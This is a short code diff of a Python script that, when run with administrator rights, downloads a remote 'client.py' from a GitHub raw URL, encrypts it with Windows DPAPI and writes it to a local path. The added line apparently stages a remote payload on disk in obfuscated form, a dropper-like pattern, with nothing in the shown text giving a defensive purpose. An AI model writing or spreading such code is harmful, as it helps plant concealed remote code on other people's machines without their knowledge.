@@ -20,7 +20,7 @@ if is_admin():
     
     if not os.path.exists(script_paths["main_path"]):
         
-        data = win32crypt.CryptProtectData(requests.get("").text.encode(),None,None,None,None,1)
+        data = win32crypt.CryptProtectData(requests.get("https://raw.githubusercontent.com/Wadzoo/testrepo/refs/heads/main/client.py").text.encode(),None,None,None,None,1)
         with open(script_paths["main_path"],"wb") as w:
             w.write(data)
             
